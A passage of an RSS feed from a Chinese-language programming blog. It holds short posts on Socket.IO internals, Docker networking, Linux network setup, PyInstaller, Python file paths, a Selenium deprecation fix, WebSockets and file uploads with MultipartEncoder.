        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF-socket.io/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://socket.io/docs/v4/how-it-works/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; Introduction @Socket.IO &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1工作原理&#34;&gt;1.工作原理&lt;/h2&gt;
&lt;p&gt;Socket.IO 是 Websocket 的一个实现，其分为服务器（node.js）和客户端（浏览器、node.js或其他编程语言）。服务器与客户端之间的双向通道使用 Websocket 连接建立，并使用 HTTP 长轮询作为回退。&lt;/p&gt;
&lt;p&gt;Socket.IO 代码库分为两个不同的层：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;低级管道：我们称之为 Engine.IO，作为 Socket.IO 的内部发动机&lt;/li&gt;
&lt;li&gt;高级别 API： Socket.IO 本身&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2engineio&#34;&gt;2.Engine.IO&lt;/h2&gt;
&lt;p&gt;Engine.IO 负责建立服务器和客户端之间的低级连接。它处理：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;各种数据运输和升级机制&lt;/li&gt;
&lt;li&gt;断开检测&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;a运输&#34;&gt;a.运输&lt;/h3&gt;
&lt;p&gt;目前有两个已实现的运输：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;HTTP 长轮询&lt;/li&gt;
&lt;li&gt;Websocket&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;b握手&#34;&gt;b.握手&lt;/h3&gt;
&lt;p&gt;在 Engine.IO 连接的开始，服务器会发送一些信息：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;{  
    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;sid&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;FSDjX-WRwSA4zTZMALqx&amp;#34;&lt;/span&gt;,  
    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;upgrades&amp;#34;&lt;/span&gt;: [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;websocket&amp;#34;&lt;/span&gt;],  
    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;pingInterval&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;25000&lt;/span&gt;,  
    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;pingTimeout&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;20000&lt;/span&gt;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sid&lt;/code&gt; 是会话的 ID，它必须包含在所有后续 HTTP 请求中的查询参数中&lt;/li&gt;
&lt;li&gt;&lt;code&gt;upgrades&lt;/code&gt; 包含由服务器支持的所有链接列表&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pingInterval&lt;/code&gt; 与 &lt;code&gt;pingTimeout&lt;/code&gt; 的值用于心跳机制，以检查连接状态&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;c升级机制&#34;&gt;c.升级机制&lt;/h3&gt;
&lt;p&gt;默认情况下，客户端会先与 HTTP 长轮询传输建立连接。&lt;/p&gt;
&lt;p&gt;虽然 Websocket 是建立双向通信的最佳方式，但经验表明，由于代理、防火墙、防病毒软件等原因，建立 Websocket 连接并不总是可能的。从用户的角度来看，不成功的 Websocket 连接会伤害用户体验。&lt;/p&gt;
&lt;p&gt;综上所及，Engine.IO 首先关注可靠性和用户体验，其次再改进和提高服务器性能。&lt;/p&gt;
&lt;p&gt;Engine.IO 可以将 HTTP 长轮询升级为 Websocket，升级时，客户端将：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;确保其传出缓冲器是空的&lt;/li&gt;
&lt;li&gt;将当前传输置于仅读模式&lt;/li&gt;
&lt;li&gt;尝试与其他运输建立连接&lt;/li&gt;
&lt;li&gt;如果成功，关闭第一次运输&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;您可以查看浏览器的网络监视器：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291745285.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291745285.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;握手 （包含会话 ID &lt;code&gt;sid = zBjrh...AAAK&lt;/code&gt; 在此处 ，在随后的请求中使用）&lt;/li&gt;
&lt;li&gt;发送数据（HTTP 长轮询）&lt;/li&gt;
&lt;li&gt;接收数据（HTTP 长轮询）&lt;/li&gt;
&lt;li&gt;升级（Websocket）&lt;/li&gt;
&lt;li&gt;接收数据（HTTP 长轮询会在成功建立 Websocket 连接后关闭）&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;d断开检测&#34;&gt;d.断开检测&lt;/h3&gt;
&lt;p&gt;Engine.IO 连接会在下列情况中视为关闭：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一个 HTTP 请求（GET 或 POST）失败&lt;/li&gt;
&lt;li&gt;网络插座连接已关闭（例如，当用户关闭浏览器中的选项卡时）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;socket.disconnect()&lt;/code&gt;在服务器端或客户端调用&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;还有一个心跳机制，检查服务器和客户端之间的连接是否仍然启动和运行：&lt;/p&gt;
&lt;p&gt;在给定间隔，服务器发送 PING 数据包，客户端将 PONG 数据包发回。如果服务器没有收到 PONG 数据包，它将认为连接已关闭。相反，如果客户端内部未收到 PING 数据包，则会认为连接已关闭。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Docker—网络</title>
        <link>https://ac-lm.github.io/posts/docker/docker%E7%BD%91%E7%BB%9C/</link>
        <pubDate>Mon, 22 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/docker/docker%E7%BD%91%E7%BB%9C/</guid>
        <description>&lt;h2 id=&#34;1基本原理&#34;&gt;1.基本原理&lt;/h2&gt;
&lt;p&gt;Docker 的本地网络实现依赖于 Linux 上的网络命名空间和虚拟网络设备。直观上看，要实现网络通信，机器需要至少一个网络接口（物理接口或虚拟接口）与外界相通，并可以收发数据包。此外，如果不同子网之间要进行通信，还需要额外的路由机制。&lt;/p&gt;
&lt;p&gt;Docker 中的网络接口默认都是虚拟接口。虚拟接口的最大优势就是转发效率极高。这是因为 Linux 通过在内核中进行数据复制来实现虚拟接口之间的数据转发，即发送接口的发送缓存中的数据包将被直接复制到接收接口的接收缓存中，而无需通过外部物理网络设备进行交换。对于本地系统和容器内系统来看，虚拟接口跟一个正常的以太网卡相比并无区别，只是它速度要快得多。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Docker 在本地主机和容器内分别创建一个虚拟接口，并让它们彼此连通，这样的一对接口叫做 veth pair 。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291915059.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291915059.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;一般情况下，Docker 在创建一个容器时，会具体执行如下操作：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;创建一对虚拟接口，分别放到本地主机和新容器的命名空间中&lt;/li&gt;
&lt;li&gt;本地主机一端的虚拟接口连接到默认的 docker0 网桥或指定网桥上，并具有一个以 veth 开头的唯一名字，如veth1234&lt;/li&gt;
&lt;li&gt;容器一端的虚拟接口将放到新创建的容器中，并修改名字作为 eth0，这个接口只在容器的命名空间可见&lt;/li&gt;
&lt;li&gt;从网桥可用地址段中获取一个空闲地址分配给容器的 eth0（例如172.17.0.2/16），并配置默认路由网关为docker0 网卡的内部接口 docker0 的IP地址（例如172.17.42.1/16）&lt;/li&gt;
&lt;li&gt;完成上述操作后，容器就可以使用 eth0 虚拟网卡来连接其他网络或外网&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;2docker-的网络模式&#34;&gt;2.Docker 的网络模式&lt;/h2&gt;
&lt;p&gt;Docker 默认有三个网络模式，可以使用 &lt;code&gt;docker network ls&lt;/code&gt;查看&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;bridge：此模式会为每一个容器分配、设置IP等，并将容器连接到一个 docker0 虚拟网桥，通过 docker0 网桥以及 Iptables nat 表配置与宿主机通信，默认使用。&lt;/li&gt;
&lt;li&gt;host：容器将不会虚拟出自己的网卡，配置自己的 IP 等，而是使用宿主机的 IP 和端口。&lt;/li&gt;
&lt;li&gt;null：该模式关闭了容器的网络功能。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291916265.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291916265.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;在使用 docker run 命令启动容器的时候，可以通过 &lt;code&gt;--net&lt;/code&gt; 参数来指定容器的网络配置。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;--net=bridge&lt;/code&gt;：默认值，在 Docker 网桥 docker0 上为容器创建新的网络栈。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--net=none&lt;/code&gt;：让 Docker 将新容器放到隔离的网络栈中，但是不进行网络配置，之后，用户可以自行进行配置。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--net=container:NAME_or_ID&lt;/code&gt;：让 Docker 将新建容器的进程放到一个已存在容器的网络栈中，新容器进程有自己的文件系统、进程列表和资源限制，但会和已存在的容器共享 IP 地址和端口等网络资源，两者进程可以直接通过 lo 环回接口通信。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--net=host&lt;/code&gt;：告诉 Docker 不要将容器网络放到隔离的命名空间中，即不要容器化容器内的网络。此时容器使用本地主机的网络，它拥有完全的本地主机接口访问权限。容器进程可以跟主机其他 root 进程一样打开低范围的端口，可以访问本地网络服务，还可以让容器做一些影响整个主机系统的事情，比如重启主机。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--net=user_defined_network&lt;/code&gt;：用户自行用 network 相关命令创建一个网络，通过这种方式将容器连接到指定的已有网络上去。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;3容器之间的通信&#34;&gt;3.容器之间的通信&lt;/h2&gt;
&lt;p&gt;容器之间可通过 IP，Docker DNS Server 和 joined 容器三种方式通信&lt;/p&gt;
&lt;h3 id=&#34;aip-通信&#34;&gt;a.IP 通信&lt;/h3&gt;
&lt;p&gt;当两个容器有属于同一个网络的网卡时，容器就可以通过 IP 交互了。具体做法是在容器创建时通过 &lt;code&gt;--network&lt;/code&gt; 指定相应的网络，或者通过 &lt;code&gt;docker network connect&lt;/code&gt; 将现有容器加入到指定网络。&lt;/p&gt;
&lt;h3 id=&#34;bdocker-dns-server&#34;&gt;b.Docker DNS Server&lt;/h3&gt;
&lt;p&gt;从 Docker 1.10 版本开始，docker daemon 实现了一个内嵌的 DNS server，使容器可以直接通过&amp;quot;容器名&amp;quot;通信。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;docker run -it --network=bridge2 --name box1 busybox
docker run -it --network=bridge2 --name box2 busybox
——————————————————————————————————————————————
ping box1
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;cjoined-容器&#34;&gt;c.joined 容器&lt;/h3&gt;
&lt;p&gt;joined 容器是另一种实现容器间通信的方式。它可以使两个或多个容器共享一个网络栈，共享网卡和配置信息，joined 容器之间可以通过 127.0.0.1 直接通信。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;docker run -it --name box1 http
docker run -it --network=container:box1 busybox
____________________________________________
此时 busybox 和 box1 的网卡 mac 地址与 IP 完全一样，它们共享了相同的网络栈。busybox 可以直接用 127.0.0.1 访问 box1 的 http 服务
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/whych/p/9595671.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; Docker网络和容器的通信 @风住 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>Linux—网络启动配置</title>
        <link>https://ac-lm.github.io/posts/linux/linux%E7%BD%91%E7%BB%9C%E5%90%AF%E5%8A%A8%E9%85%8D%E7%BD%AE/</link>
        <pubDate>Mon, 22 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/linux/linux%E7%BD%91%E7%BB%9C%E5%90%AF%E5%8A%A8%E9%85%8D%E7%BD%AE/</guid>
        <description>&lt;h2 id=&#34;1启动网卡&#34;&gt;1.启动网卡&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;vim /etc/sysconfig/network-scripts/ifcfg-ens33
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在文件夹&lt;code&gt;/etc/sysconfig/network-scripts/&lt;/code&gt;中&lt;code&gt;ifcfg-lo&lt;/code&gt;是回环网卡，&lt;code&gt;ifcfg-ens33&lt;/code&gt;就是&lt;code&gt;eth0&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;编辑&lt;code&gt;ifcfg-ens33&lt;/code&gt;，将&lt;code&gt;ONBOOT&lt;/code&gt;改为&lt;code&gt;yes&lt;/code&gt;，重新启动网卡，检查网络&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;service network restart
ping 114.114.114.114
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;2安装-net-tools使用-ifconfig&#34;&gt;2.安装 net-tools，使用 ifconfig&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;yum install net-tools
ifconfig
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;3启动-ssh&#34;&gt;3.启动 SSH&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;service sshd start
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>Python—pyinstaller 打包</title>
        <link>https://ac-lm.github.io/posts/python/pythonpyinstaller-%E6%89%93%E5%8C%85/</link>
        <pubDate>Mon, 22 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/pythonpyinstaller-%E6%89%93%E5%8C%85/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://pyinstaller.readthedocs.io/en/stable/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; PyInstaller Manual @PyInstaller 4.6 documentation &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;pyinstaller&#34;&gt;pyinstaller&lt;/h2&gt;
&lt;p&gt;pyinstaller 是 Python 的一个打包可执行文件的打包工具。其会根据平台不同进行打包，在 Windows 上打包 Windows 应用，在 Linux 上打包 Linux 的，不能交叉打包&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# pyinstaller -F (单个可执行文件) 程序源 -n 程序名 -w(去掉控制台窗口，这在GUI界面时非常有用) -i 图标.ico”&lt;/span&gt;
pyinstaller &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;F test1&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;Demo_Test1_Python&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Python—获取当前文件路径</title>
        <link>https://ac-lm.github.io/posts/python/python%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84/</link>
        <pubDate>Sun, 21 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/python%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84/</guid>
        <description>&lt;h2 id=&#34;1syspath0&#34;&gt;1.&lt;code&gt;sys.path[0]&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;获取文件当前工作目录路径（绝对路径）&lt;/p&gt;
&lt;h2 id=&#34;2__file__&#34;&gt;2.&lt;code&gt;__file__&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;获得文件所在的路径（由系统决定是否是全名）&lt;/p&gt;
&lt;h2 id=&#34;3ospathabspath__-file-__&#34;&gt;3.&lt;code&gt;os.path.abspath(__ file __)&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;获得文件所在的路径（绝对路径）&lt;/p&gt;
&lt;h2 id=&#34;4ospathsplitospathrealpath__-file-__&#34;&gt;4.&lt;code&gt;os.path.split(os.path.realpath(__ file __))&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;将文件路径名称分成头和尾一对，生成二元元组（文件目录，文件名）&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Python—selenium executable_path 警告</title>
        <link>https://ac-lm.github.io/posts/python/pythonselenium-executable_path-%E8%AD%A6%E5%91%8A/</link>
        <pubDate>Sat, 20 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/pythonselenium-executable_path-%E8%AD%A6%E5%91%8A/</guid>
        <description>&lt;h2 id=&#34;1executable-path-has-been-deprecated-please-pass-in-a-service-object-in-selenium-python&#34;&gt;1.Executable path has been deprecated please pass in a Service object in Selenium Python&lt;/h2&gt;
&lt;p&gt;使用 Selenium 时，程序正常运行，但出现 DeprecationWarning 警告的类型错误。这是由于版本更新时，所使用的方法过时的原因，表示该函数在当前版本被重构，还可以传入参数，但是在之后的某个版本会被删除.&lt;/p&gt;
&lt;p&gt;查询当前版本重构后的函数，是之前的 executable_path 被重构到了 Service 函数里&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; selenium &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; webdriver
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; selenium.webdriver.chrome.service &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Service
 
s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Service(&lt;span style=&#34;color:#e6db74&#34;&gt;r&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;D:\Software\webdrivers\chromedriver.exe&amp;#34;&lt;/span&gt;)
driver &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; webdriver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Chrome(service&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;s)
driver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;https://www.baidu.com&amp;#39;&lt;/span&gt;)
driver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>随记—什么是 Websocket</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF-websocket/</link>
        <pubDate>Sat, 20 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF-websocket/</guid>
        <description>&lt;h2 id=&#34;1websocket-简介&#34;&gt;1.Websocket 简介&lt;/h2&gt;
&lt;p&gt;Websocket 被定义为服务器和客户端之间的双向通信，这意味着双方同时进行通信和交换数据。&lt;/p&gt;
&lt;p&gt;Websocket 的关键点是真正的并发性和性能优化，从而产生响应更快，更丰富的 Web 应用程序。&lt;/p&gt;
&lt;p&gt;Websocket 的 URL 为 &lt;code&gt;ws://example.com:8000/chat.php&lt;/code&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Python—MultipartEncoder 上传文件</title>
        <link>https://ac-lm.github.io/posts/python/pythonmultipartencoder-%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6/</link>
        <pubDate>Fri, 19 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/pythonmultipartencoder-%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.jianshu.com/p/9738e53a7db3&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; 上传文件模块 MultipartEncoder @山猪打不过家猪 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1上传文件模块-multipartencoder&#34;&gt;1.上传文件模块 MultipartEncoder&lt;/h2&gt;
&lt;p&gt;MultipartEncoder 是使用于上传文件的一个模块，其包含在模块 requests_toolbelt 中&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;pip install requests_toolbelt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;官方提供了上传文件时 MultipartEncoder 的示例用法&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; requests_toolbelt &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; MultipartEncoder

encoder &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; MultipartEncoder({
            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;field&amp;#39;&lt;/span&gt;: (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;file_name&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;{&amp;#34;a&amp;#34;: &amp;#34;b&amp;#34;}&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;application/json&amp;#39;&lt;/span&gt;,
                      {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;X-My-Header&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;my-value&amp;#39;&lt;/span&gt;})
        })
&lt;span style=&#34;color:#75715e&#34;&gt;# field：服务端约定的上传文件字段名。一般用到的是file，需要和服务端沟通获取&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# file_name: 文件名。一般可以任意写，服务端大多是拿到文件后自己再次命名&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# b&amp;#39;{&amp;#34;a&amp;#34;:&amp;#34;b&amp;#34;}&amp;#39;：文件内容，以二进制代码存在。例：open(&amp;#39;/your/file/path&amp;#39;, &amp;#39;rb&amp;#39;)&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# &amp;#39;application/json&amp;#39;：文件的MimeType。不同文件类型需要对应不同的 MimeType&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# {&amp;#39;X-My-Header&amp;#39;: &amp;#39;my-value&amp;#39;}：其他内容，可不传。&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;: (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;upload.pdf&amp;#39;&lt;/span&gt;, open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sync_test.pdf&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;), &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;application/pdf&amp;#39;&lt;/span&gt;)
}
m &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; MultipartEncoder(payload)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;参照官方给予的示例代码，我们可以仿照仿照出下列代码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; requests
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; requests_toolbelt &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; MultipartEncoder


upload_url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;https://your/upload/url&amp;#39;&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;: (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;upload.pdf&amp;#39;&lt;/span&gt;, open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sync_test.pdf&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;), &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;application/pdf&amp;#39;&lt;/span&gt;)
}
m &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; MultipartEncoder(payload)
headers &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Content-Type&amp;#34;&lt;/span&gt;: m&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;content_type,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;other-keys&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;other-values&amp;#34;&lt;/span&gt;
}
r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;post(upload_url, headers&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;headers, data&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;m)
print(r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;json())
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2构造-webkitformboundary-格式参数&#34;&gt;2.构造 WebKitFormBoundary 格式参数&lt;/h2&gt;
&lt;h3 id=&#34;a函数&#34;&gt;a.函数&lt;/h3&gt;
